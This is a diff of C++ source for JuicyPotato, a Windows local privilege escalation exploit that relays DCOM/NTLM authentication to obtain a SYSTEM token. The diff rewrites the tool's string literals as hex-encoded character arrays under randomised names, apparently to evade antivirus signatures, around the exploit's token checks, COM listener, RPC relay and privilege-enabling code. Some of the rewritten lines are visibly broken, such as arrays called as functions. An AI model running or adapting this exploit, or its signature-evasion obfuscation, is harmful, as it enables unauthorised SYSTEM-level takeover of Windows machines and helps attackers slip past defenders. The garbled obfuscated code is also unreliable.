@@ -42,17 +42,9 @@ wchar_t *processname = NULL;
 int IsTokenSystem(HANDLE tok)
 {
 	
-	TCHAR  hid_U_s_e__Qa4yTRNKu4YN[] = {'\x55','\x73','\x65','\x72',0};
+	const char  hid__S__S__EHPTkuiI96KT[] = {'\x25','\x53','\x3b','\x25','\x53','\\','\x25','\x53','\n',0};
 
-	TCHAR  hid_S_i_z__UGQom6UutU9I[] = {'\x53','\x69','\x7a','\x65',0};
-
-	TCHAR  hid_S_i_z__uDImG4CmnwhG[] = {'\x53','\x69','\x7a','\x65',0};
-
-	TCHAR  hid_s_i_d__jIiEeCmCXIOX[] = {'\x73','\x69','\x64',0};
-
-	const char  hid__S__S__qvzW8mztWrBZ[] = {'\x25','\x53','\x3b','\x25','\x53','\\','\x25','\x53','\n',0};
-
-	const wchar_t  hid_S_Y_S__AvdRBeC86Vbh[] = {'\x53','\x59','\x53','\x54','\x45','\x4d',0};
+	const wchar_t  hid_S_Y_S__lLPlNf0OLMzU[] = {'\x53','\x59','\x53','\x54','\x45','\x4d',0};
 DWORD Size, UserSize, DomainSize;
 	SID *sid;
 	SID_NAME_USE SidType;
@@ -64,13 +56,13 @@ DWORD Size, UserSize, DomainSize;
 		return FALSE;
 
 	User = (TOKEN_USER *)malloc(Size);
-	hid_U_s_e__Qa4yTRNKu4YN(User);
+	assert(User);
 	GetTokenInformation(tok, TokenUser, User, Size, &Size);
-	hid_S_i_z__UGQom6UutU9I(Size);
+	assert(Size);
 	Size = GetLengthSid(User->User.Sid);
-	hid_S_i_z__uDImG4CmnwhG(Size);
+	assert(Size);
 	sid = (SID *)malloc(Size);
-	hid_s_i_d__jIiEeCmCXIOX(sid);
+	assert(sid);
 
 	CopySid(Size, sid, User->User.Sid);
 	UserSize = (sizeof UserName / sizeof *UserName) - 1;
@@ -78,8 +70,8 @@ DWORD Size, UserSize, DomainSize;
 	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
 	free(sid);
 
-	printf(hid__S__S__qvzW8mztWrBZ, olestr, DomainName, UserName);
-	if (!_wcsicmp(UserName, hid_S_Y_S__AvdRBeC86Vbh))
+	printf(hid__S__S__EHPTkuiI96KT, olestr, DomainName, UserName);
+	if (!_wcsicmp(UserName, hid_S_Y_S__lLPlNf0OLMzU))
 		return 1;
 
 	return 0;
@@ -88,18 +80,18 @@ DWORD Size, UserSize, DomainSize;
 void usage()
 {
 	
-	const char  hid_JuicyP_Lvd62l6NuM1f[] = {'\x4a','\x75','\x69','\x63','\x79','\x50','\x6f','\x74','\x61','\x74','\x6f','\x20','\x76','\x25','\x73','\x20','\n','\n',0};
+	const char  hid_JuicyP_cJhwyU3MRiBA[] = {'\x4a','\x75','\x69','\x63','\x79','\x50','\x6f','\x74','\x61','\x74','\x6f','\x20','\x76','\x25','\x73','\x20','\n','\n',0};
 
-	const char  hid_Mandat_9EfwmhTANLJ3[] = {'\x4d','\x61','\x6e','\x64','\x61','\x74','\x6f','\x72','\x79','\x20','\x61','\x72','\x67','\x73','\x3a','\x20','\n','\x2d','\x74','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x70','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x63','\x61','\x6c','\x6c','\x3a','\x20','\x3c','\x74','\x3e','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x2c','\x20','\x3c','\x75','\x3e','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x2c','\x20','\x3c','\x2a','\x3e','\x20','\x74','\x72','\x79','\x20','\x62','\x6f','\x74','\x68','\n','\x2d','\x70','\x20','\x3c','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x3e','\x3a','\x20','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x20','\x74','\x6f','\x20','\x6c','\x61','\x75','\x6e','\x63','\x68','\n','\x2d','\x6c','\x20','\x3c','\x70','\x6f','\x72','\x74','\x3e','\x3a','\x20','\x43','\x4f','\x4d','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x70','\x6f','\x72','\x74','\n',0};
+	const char  hid_Mandat_AFW87SDKLsOf[] = {'\x4d','\x61','\x6e','\x64','\x61','\x74','\x6f','\x72','\x79','\x20','\x61','\x72','\x67','\x73','\x3a','\x20','\n','\x2d','\x74','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x70','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x63','\x61','\x6c','\x6c','\x3a','\x20','\x3c','\x74','\x3e','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x2c','\x20','\x3c','\x75','\x3e','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x2c','\x20','\x3c','\x2a','\x3e','\x20','\x74','\x72','\x79','\x20','\x62','\x6f','\x74','\x68','\n','\x2d','\x70','\x20','\x3c','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x3e','\x3a','\x20','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x20','\x74','\x6f','\x20','\x6c','\x61','\x75','\x6e','\x63','\x68','\n','\x2d','\x6c','\x20','\x3c','\x70','\x6f','\x72','\x74','\x3e','\x3a','\x20','\x43','\x4f','\x4d','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x70','\x6f','\x72','\x74','\n',0};
 
-	const char  hid_Option_b0d8GTWMWtST[] = {'\x4f','\x70','\x74','\x69','\x6f','\x6e','\x61','\x6c','\x20','\x61','\x72','\x67','\x73','\x3a','\x20','\n','\x2d','\x6d','\x20','\x3c','\x69','\x70','\x3e','\x3a','\x20','\x43','\x4f','\x4d','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x61','\x64','\x64','\x72','\x65','\x73','\x73','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31','\x29','\n','\x2d','\x61','\x20','\x3c','\x61','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x3e','\x3a','\x20','\x63','\x6f','\x6d','\x6d','\x61','\x6e','\x64','\x20','\x6c','\x69','\x6e','\x65','\x20','\x61','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x20','\x74','\x6f','\x20','\x70','\x61','\x73','\x73','\x20','\x74','\x6f','\x20','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x4e','\x55','\x4c','\x4c','\x29','\n','\x2d','\x6b','\x20','\x3c','\x69','\x70','\x3e','\x3a','\x20','\x52','\x50','\x43','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x69','\x70','\x20','\x61','\x64','\x64','\x72','\x65','\x73','\x73','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31','\x29','\n','\x2d','\x6e','\x20','\x3c','\x70','\x6f','\x72','\x74','\x3e','\x3a','\x20','\x52','\x50','\x43','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x70','\x6f','\x72','\x74','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x33','\x35','\x29','\n','\x2d','\x63','\x20','\x3c','\x7b','\x63','\x6c','\x73','\x69','\x64','\x7d','\x3e','\x3a','\x20','\x43','\x4c','\x53','\x49','\x44','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x42','\x49','\x54','\x53','\x3a','\x7b','\x34','\x39','\x39','\x31','\x64','\x33','\x34','\x62','\x2d','\x38','\x30','\x61','\x31','\x2d','\x34','\x32','\x39','\x31','\x2d','\x38','\x33','\x62','\x36','\x2d','\x33','\x33','\x32','\x38','\x33','\x36','\x36','\x62','\x39','\x30','\x39','\x37','\x7d','\x29','\n','\x2d','\x7a','\x20','\x6f','\x6e','\x6c','\x79','\x20','\x74','\x65','\x73','\x74','\x20','\x43','\x4c','\x53','\x49','\x44','\x20','\x61','\x6e','\x64','\x20','\x70','\x72','\x69','\x6e','\x74','\x20','\x74','\x6f','\x6b','\x65','\x6e','\'','\x73','\x20','\x75','\x73','\x65','\x72','\n',0};
-printf(hid_JuicyP_Lvd62l6NuM1f, VERSION);
+	const char  hid_Option_HbAlpntYUBkk[] = {'\x4f','\x70','\x74','\x69','\x6f','\x6e','\x61','\x6c','\x20','\x61','\x72','\x67','\x73','\x3a','\x20','\n','\x2d','\x6d','\x20','\x3c','\x69','\x70','\x3e','\x3a','\x20','\x43','\x4f','\x4d','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x61','\x64','\x64','\x72','\x65','\x73','\x73','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31','\x29','\n','\x2d','\x61','\x20','\x3c','\x61','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x3e','\x3a','\x20','\x63','\x6f','\x6d','\x6d','\x61','\x6e','\x64','\x20','\x6c','\x69','\x6e','\x65','\x20','\x61','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x20','\x74','\x6f','\x20','\x70','\x61','\x73','\x73','\x20','\x74','\x6f','\x20','\x70','\x72','\x6f','\x67','\x72','\x61','\x6d','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x4e','\x55','\x4c','\x4c','\x29','\n','\x2d','\x6b','\x20','\x3c','\x69','\x70','\x3e','\x3a','\x20','\x52','\x50','\x43','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x69','\x70','\x20','\x61','\x64','\x64','\x72','\x65','\x73','\x73','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31','\x29','\n','\x2d','\x6e','\x20','\x3c','\x70','\x6f','\x72','\x74','\x3e','\x3a','\x20','\x52','\x50','\x43','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x70','\x6f','\x72','\x74','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x31','\x33','\x35','\x29','\n','\x2d','\x63','\x20','\x3c','\x7b','\x63','\x6c','\x73','\x69','\x64','\x7d','\x3e','\x3a','\x20','\x43','\x4c','\x53','\x49','\x44','\x20','\x28','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x42','\x49','\x54','\x53','\x3a','\x7b','\x34','\x39','\x39','\x31','\x64','\x33','\x34','\x62','\x2d','\x38','\x30','\x61','\x31','\x2d','\x34','\x32','\x39','\x31','\x2d','\x38','\x33','\x62','\x36','\x2d','\x33','\x33','\x32','\x38','\x33','\x36','\x36','\x62','\x39','\x30','\x39','\x37','\x7d','\x29','\n','\x2d','\x7a','\x20','\x6f','\x6e','\x6c','\x79','\x20','\x74','\x65','\x73','\x74','\x20','\x43','\x4c','\x53','\x49','\x44','\x20','\x61','\x6e','\x64','\x20','\x70','\x72','\x69','\x6e','\x74','\x20','\x74','\x6f','\x6b','\x65','\x6e','\'','\x73','\x20','\x75','\x73','\x65','\x72','\n',0};
+printf(hid_JuicyP_cJhwyU3MRiBA, VERSION);
 
-	printf(hid_Mandat_9EfwmhTANLJ3
+	printf(hid_Mandat_AFW87SDKLsOf
 	);
 
 	printf("\n\n");
-	printf(hid_Option_b0d8GTWMWtST
+	printf(hid_Option_HbAlpntYUBkk
 	);
 }
 
@@ -154,7 +146,9 @@ int PotatoAPI::findNTLMBytes(char *bytes, int len) {
 }
 
 int PotatoAPI::processNtlmBytes(char *bytes, int len) {
-	int ntlmLoc = findNTLMBytes(bytes, len);
+	
+	const char  hid_Error__LUmbJ2vyqxWg[] = {'\x45','\x72','\x72','\x6f','\x72','\x20','\x2d','\x20','\x55','\x6e','\x6b','\x6e','\x6f','\x77','\x6e','\x20','\x4e','\x54','\x4c','\x4d','\x20','\x6d','\x65','\x73','\x73','\x61','\x67','\x65','\x20','\x74','\x79','\x70','\x65','\x2e','\x2e','\x2e',0};
+int ntlmLoc = findNTLMBytes(bytes, len);
 	if (ntlmLoc == -1) return -1;
 
 	int messageType = bytes[ntlmLoc + 8];
@@ -172,7 +166,7 @@ int PotatoAPI::processNtlmBytes(char *bytes, int len) {
 			negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
 			break;
 		default:
-			printf(hid_Error__cugMgfiQJHtz);
+			printf(hid_Error__LUmbJ2vyqxWg);
 			return -1;
 			break;
 	}
@@ -195,7 +189,9 @@ int checkForNewConnection(SOCKET* ListenSocket, SOCKET* ClientSocket) {
 
 int PotatoAPI::triggerDCOM(void)
 {
-	CoInitialize(nullptr);
+	
+	const wchar_t  hid________HMLzbPdwmrD4[] = {'\x7b','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x2d','\x30','\x30','\x30','\x30','\x2d','\x30','\x30','\x30','\x30','\x2d','\x43','\x30','\x30','\x30','\x2d','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x30','\x34','\x36','\x7d',0};
+CoInitialize(nullptr);
 
 	//Create IStorage object
 	IStorage *stg = NULL;
@@ -212,7 +208,7 @@ int PotatoAPI::triggerDCOM(void)
 	CLSIDFromString(olestr, &clsid);
 	CLSID tmp;
 	//IUnknown IID
-	CLSIDFromString(hid________R7GHQ5oXtnsA("{00000000-0000-0000-C000-000000000046}"), &tmp);
+	CLSIDFromString(hid________HMLzbPdwmrD4("{00000000-0000-0000-C000-000000000046}"), &tmp);
 	MULTI_QI qis[1];
 	qis[0].pIID = &tmp;
 	qis[0].pItf = NULL;
@@ -226,7 +222,23 @@ int PotatoAPI::triggerDCOM(void)
 }
 
 int PotatoAPI::startRPCConnection(void) {
-	const int DEFAULT_BUFLEN = 4096;
+	
+	const char  hid_WSASta_v1uGS9svtRFv[] = {'\x57','\x53','\x41','\x53','\x74','\x61','\x72','\x74','\x75','\x70','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+
+	const char  hid________3QJHFn7V3h6j[] = {'\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31',0};
+
+	const char  hid_getadd_NogQM2nbRNWX[] = {'\x67','\x65','\x74','\x61','\x64','\x64','\x72','\x69','\x6e','\x66','\x6f','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+
+	const char  hid_socket_UcjDUbzheZ0G[] = {'\x73','\x6f','\x63','\x6b','\x65','\x74','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x6c','\x64','\n',0};
+
+	const char  hid_Unable_ZIfFBqqeZoga[] = {'\x55','\x6e','\x61','\x62','\x6c','\x65','\x20','\x74','\x6f','\x20','\x63','\x6f','\x6e','\x6e','\x65','\x63','\x74','\x20','\x74','\x6f','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x21','\n',0};
+
+	const char  hid_RPC____HuVllUzfsdP8[] = {'\x52','\x50','\x43','\x20','\x2d','\x3e','\x20','\x73','\x65','\x6e','\x64','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+
+	const char  hid_RPC____pHXkKAfAXl8r[] = {'\x52','\x50','\x43','\x2d','\x3e','\x20','\x43','\x6f','\x6e','\x6e','\x65','\x63','\x74','\x69','\x6f','\x6e','\x20','\x63','\x6c','\x6f','\x73','\x65','\x64','\n',0};
+
+	const char  hid_RPC____R6Y9GtnsQlDX[] = {'\x52','\x50','\x43','\x20','\x2d','\x3e','\x20','\x72','\x65','\x63','\x76','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+const int DEFAULT_BUFLEN = 4096;
 
 	fflush(stdout);
 	WSADATA wsaData;
@@ -243,7 +255,7 @@ int PotatoAPI::startRPCConnection(void) {
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != 0) {
-		printf(hid_WSASta_JEDA6MbVXuHy, iResult);
+		printf(hid_WSASta_v1uGS9svtRFv, iResult);
 		return 1;
 	}
 
@@ -261,7 +273,7 @@ int PotatoAPI::startRPCConnection(void) {
 		wcstombs(myhost, rpcserver, 24);
 	}
 	else {
-		strcpy(myhost, hid________cmGBXtWV7Zs7);
+		strcpy(myhost, hid________3QJHFn7V3h6j);
 	}
 
 	if (rpcport != NULL) {
@@ -274,7 +286,7 @@ int PotatoAPI::startRPCConnection(void) {
 
 	iResult = getaddrinfo(myhost, myport, &hints, &result);
 	if (iResult != 0) {
-		printf(hid_getadd_xTFqf2We3BeH, iResult);
+		printf(hid_getadd_NogQM2nbRNWX, iResult);
 		WSACleanup();
 		return 1;
 	}
@@ -284,7 +296,7 @@ int PotatoAPI::startRPCConnection(void) {
 		// Create a SOCKET for connecting to server
 		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
 		if (ConnectSocket == INVALID_SOCKET) {
-			printf(hid_socket_u0w0m05Dz7bZ, WSAGetLastError());
+			printf(hid_socket_UcjDUbzheZ0G, WSAGetLastError());
 			WSACleanup();
 			return 1;
 		}
@@ -301,7 +313,7 @@ int PotatoAPI::startRPCConnection(void) {
 	}
 
 	if (ConnectSocket == INVALID_SOCKET) {
-		printf(hid_Unable_xSlLN5kggCdJ);
+		printf(hid_Unable_ZIfFBqqeZoga);
 		WSACleanup();
 		return 1;
 	}
@@ -324,7 +336,7 @@ int PotatoAPI::startRPCConnection(void) {
 
 		iResult = send(ConnectSocket, sendbuf, *len, 0);
 		if (iResult == SOCKET_ERROR) {
-			printf(hid_RPC____KSotyjPPQ7Yb, WSAGetLastError());
+			printf(hid_RPC____HuVllUzfsdP8, WSAGetLastError());
 			closesocket(ConnectSocket);
 			WSACleanup();
 			return 0;
@@ -336,10 +348,10 @@ int PotatoAPI::startRPCConnection(void) {
 			comSendQ->push(recvbuf);
 		}
 		else if (iResult == 0) {
-			printf(hid_RPC____qsW5kcWokMWX);
+			printf(hid_RPC____pHXkKAfAXl8r);
 		}
 		else {
-			printf(hid_RPC____J44tvxeIWHjo, WSAGetLastError());
+			printf(hid_RPC____R6Y9GtnsQlDX, WSAGetLastError());
 			return 0;
 		}
 
@@ -356,7 +368,25 @@ int PotatoAPI::startRPCConnection(void) {
 }
 
 int PotatoAPI::startCOMListener(void) {
-	const int DEFAULT_BUFLEN = 4096;
+	
+	const char  hid_WSASta_OtiJcv34ZOAg[] = {'\x57','\x53','\x41','\x53','\x74','\x61','\x72','\x74','\x75','\x70','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+
+	const char  hid_getadd_oBjFOB2Gve61[] = {'\x67','\x65','\x74','\x61','\x64','\x64','\x72','\x69','\x6e','\x66','\x6f','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+
+	const char  hid_socket_mBjCIgXCVJOy[] = {'\x73','\x6f','\x63','\x6b','\x65','\x74','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x6c','\x64','\n',0};
+
+	const char  hid_bind_f_PK2rpwGa542g[] = {'\x62','\x69','\x6e','\x64','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+
+	const char  hid_listen_BW7Vy86O9oLA[] = {'\x6c','\x69','\x73','\x74','\x65','\x6e','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+
+	const char  hid_accept_bQVXMPX4MdFU[] = {'\x61','\x63','\x63','\x65','\x70','\x74','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+
+	const char  hid_COM____SaSD0aaXf76m[] = {'\x43','\x4f','\x4d','\x20','\x2d','\x3e','\x20','\x73','\x65','\x6e','\x64','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+
+	const char  hid_COM____WFzc0orj0B5U[] = {'\x43','\x4f','\x4d','\x20','\x2d','\x3e','\x20','\x72','\x65','\x63','\x76','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+
+	const char  hid_shutdo_mUZjkM1hTMBy[] = {'\x73','\x68','\x75','\x74','\x64','\x6f','\x77','\x6e','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x65','\x72','\x72','\x6f','\x72','\x3a','\x20','\x25','\x64','\n',0};
+const int DEFAULT_BUFLEN = 4096;
 	WSADATA wsaData;
 	int iResult;
 	struct addrinfo *result = NULL;
@@ -369,7 +399,7 @@ int PotatoAPI::startCOMListener(void) {
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != 0) {
-		printf(hid_WSASta_tpAAFKCtwAhj, iResult);
+		printf(hid_WSASta_OtiJcv34ZOAg, iResult);
 		return 1;
 	}
 
@@ -387,7 +417,7 @@ int PotatoAPI::startCOMListener(void) {
 	iResult = getaddrinfo(NULL, dcom_port, &hints, &result);
 
 	if (iResult != 0) {
-		printf(hid_getadd_leicnGe6o5Ar, iResult);
+		printf(hid_getadd_oBjFOB2Gve61, iResult);
 		WSACleanup();
 		return 1;
 	}
@@ -398,7 +428,7 @@ int PotatoAPI::startCOMListener(void) {
 	setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval));
 
 	if (ListenSocket == INVALID_SOCKET) {
-		printf(hid_socket_C0B0PHBFdtAm, WSAGetLastError());
+		printf(hid_socket_mBjCIgXCVJOy, WSAGetLastError());
 		freeaddrinfo(result);
 		WSACleanup();
 		return 1;
@@ -408,7 +438,7 @@ int PotatoAPI::startCOMListener(void) {
 	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
 	//printf("startCOMListener bindresult%d\n", iResult);
 	if (iResult == SOCKET_ERROR) {
-		printf(hid_bind_f_oLABvWQ8Wthv, WSAGetLastError());
+		printf(hid_bind_f_PK2rpwGa542g, WSAGetLastError());
 		freeaddrinfo(result);
 		closesocket(ListenSocket);
 		WSACleanup();
@@ -419,7 +449,7 @@ int PotatoAPI::startCOMListener(void) {
 
 	iResult = listen(ListenSocket, SOMAXCONN);
 	if (iResult == SOCKET_ERROR) {
-		printf(hid_listen_3o4kZc3zMQAQ, WSAGetLastError());
+		printf(hid_listen_BW7Vy86O9oLA, WSAGetLastError());
 		closesocket(ListenSocket);
 		WSACleanup();
 		return 1;
@@ -436,7 +466,7 @@ int PotatoAPI::startCOMListener(void) {
 	{
 		ClientSocket = accept(ListenSocket, NULL, NULL);
 		if (ClientSocket == INVALID_SOCKET) {
-			printf(hid_accept_0UMno9KRCIow, WSAGetLastError());
+			printf(hid_accept_bQVXMPX4MdFU, WSAGetLastError());
 			closesocket(ListenSocket);
 			WSACleanup();
 			return 1;
@@ -470,7 +500,7 @@ int PotatoAPI::startCOMListener(void) {
 			iSendResult = send(ClientSocket, sendbuf, *len, 0);
 
 			if (iSendResult == SOCKET_ERROR) {
-				printf(hid_COM____n3Vg2nHoYHzI, WSAGetLastError());
+				printf(hid_COM____SaSD0aaXf76m, WSAGetLastError());
 				exit(-11);
 			}
 
@@ -486,7 +516,7 @@ int PotatoAPI::startCOMListener(void) {
 		}
 		else {
 			if (!TEST_mode)
-				printf(hid_COM____rKM3kXbltAb3, WSAGetLastError());
+				printf(hid_COM____WFzc0orj0B5U, WSAGetLastError());
 
 			shutdown(ClientSocket, SD_SEND);
 			WSACleanup();
@@ -500,7 +530,7 @@ int PotatoAPI::startCOMListener(void) {
 	iResult = shutdown(ClientSocket, SD_SEND);
 	//	printf("startCOMListener iResult ComLisetner:%d\n", iResult);
 	if (iResult == SOCKET_ERROR) {
-		printf(hid_shutdo_wlsxDmAKeJ28, WSAGetLastError());
+		printf(hid_shutdo_mUZjkM1hTMBy, WSAGetLastError());
 		closesocket(ClientSocket);
 		WSACleanup();
 		exit(-1);
@@ -515,15 +545,15 @@ int PotatoAPI::startCOMListener(void) {
 BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
 {
 	
-	const char  hid_Priv_L_XRzkh9cFtKEU[] = {'\x50','\x72','\x69','\x76','\x20','\x4c','\x6f','\x6f','\x6b','\x75','\x70','\x20','\x46','\x41','\x4c','\x53','\x45','\n',0};
+	const char  hid_Priv_L_MktkB6B0sApP[] = {'\x50','\x72','\x69','\x76','\x20','\x4c','\x6f','\x6f','\x6b','\x75','\x70','\x20','\x46','\x41','\x4c','\x53','\x45','\n',0};
 
-	const char  hid_Priv_A_zi73ypB5DWb5[] = {'\x50','\x72','\x69','\x76','\x20','\x41','\x64','\x6a','\x75','\x73','\x74','\x20','\x46','\x41','\x4c','\x53','\x45','\n',0};
+	const char  hid_Priv_A_5pJ7asK0uCwH[] = {'\x50','\x72','\x69','\x76','\x20','\x41','\x64','\x6a','\x75','\x73','\x74','\x20','\x46','\x41','\x4c','\x53','\x45','\n',0};
 TOKEN_PRIVILEGES tp;
 	LUID luid;
 
 	if (!LookupPrivilegeValue(NULL, priv, &luid))
 	{
-		printf(hid_Priv_L_XRzkh9cFtKEU);
+		printf(hid_Priv_L_MktkB6B0sApP);
 		return FALSE;
 	}
 
@@ -538,7 +568,7 @@ TOKEN_PRIVILEGES tp;
 		(PTOKEN_PRIVILEGES)NULL,
 		(PDWORD)NULL))
 	{
-		printf(hid_Priv_A_zi73ypB5DWb5);
+		printf(hid_Priv_A_5pJ7asK0uCwH);
 		return FALSE;
 	}
 
@@ -549,12 +579,12 @@ TOKEN_PRIVILEGES tp;
 int wmain(int argc, wchar_t** argv)
 {
 	
-	const char  hid________rgeon4n30PWb[] = {'\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31',0};
+	const char  hid________c4DxVm3xYnAy[] = {'\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31',0};
 
-	const char  hid_Wrong__br8IWFiJF6pd[] = {'\x57','\x72','\x6f','\x6e','\x67','\x20','\x41','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x3a','\x20','\x25','\x73','\n',0};
+	const char  hid_Wrong__QspHogr30wVS[] = {'\x57','\x72','\x6f','\x6e','\x67','\x20','\x41','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x3a','\x20','\x25','\x73','\n',0};
 BOOL brute = FALSE;
 
-	strcpy(dcom_ip, hid________rgeon4n30PWb);
+	strcpy(dcom_ip, hid________c4DxVm3xYnAy);
 	while ((argc > 1) && (argv[1][0] == '-'))
 	{
 		switch (argv[1][1])
@@ -618,7 +648,7 @@ BOOL brute = FALSE;
 				break;
 
 			default:
-				printf(hid_Wrong__br8IWFiJF6pd, argv[1]);
+				printf(hid_Wrong__QspHogr30wVS, argv[1]);
 				usage();
 				exit(-1);
 		}
@@ -649,29 +679,29 @@ BOOL brute = FALSE;
 int Juicy(wchar_t *clsid, BOOL brute)
 {
 	
-	const char  hid_Testin_2jH42VV4RFRK[] = {'\x54','\x65','\x73','\x74','\x69','\x6e','\x67','\x20','\x25','\x53','\x20','\x25','\x53','\n',0};
+	const char  hid_Testin_Ydf7Ang4gRse[] = {'\x54','\x65','\x73','\x74','\x69','\x6e','\x67','\x20','\x25','\x53','\x20','\x25','\x53','\n',0};
 
